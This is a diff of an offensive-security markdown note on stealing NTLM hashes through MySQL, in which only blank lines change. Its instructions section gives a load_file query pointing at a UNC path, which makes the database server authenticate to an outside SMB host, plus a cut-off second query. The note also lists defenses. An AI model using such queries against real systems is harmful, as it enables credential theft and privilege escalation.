@@ -34,11 +34,15 @@ To execute this attack, the attacker needs to have valid credentials to access t
 
 This technique is valuable for attackers because it allows them to steal NTLM hashes without being detected by traditional security measures such as antivirus software or intrusion detection systems.
 
+ 
+
 ## Requirements
 
 1. Valid credentials to access the MYSQL database
 
 1. Access to the remote Windows machine through SMB
+
+ 
 
 ## Defense
 
@@ -48,18 +52,28 @@ This technique is valuable for attackers because it allows them to steal NTLM ha
 
 1. Monitor network traffic for suspicious activity
 
+ 
+
 ## Objectives
 
 1. Steal NTLM hashes from a remote Windows machine
 
 1. Escalate privileges and gain access to sensitive information
 
+ 
+
 # Instructions
 
 1. These commands are used to access files on the server through SQL queries.
 
+ 
+
+
+
 **Code**: [[select load_file('\\\\error\\abc');
 select load_fi]]
+
+
 
 > The 'load_file' command is used to read the contents of a file from the server's file system. The first argument of the command is the path of the file to be read. The 'into dumpfile' and 'into outfile' commands are used to write data to a file on the server's file system. The argument of these commands is the path of the file to be written. The 'load data infile' command is used to load data from a file into a table in the database. The argument of this command is the path of the file to be loaded.
 
@@ -80,3 +94,5 @@ select load_fi]]
 - [[MYSQL Injection]]
 - [[MYSQL Out of band]]
 - [[UNC Path - NTLM hash stealing]]
+
+
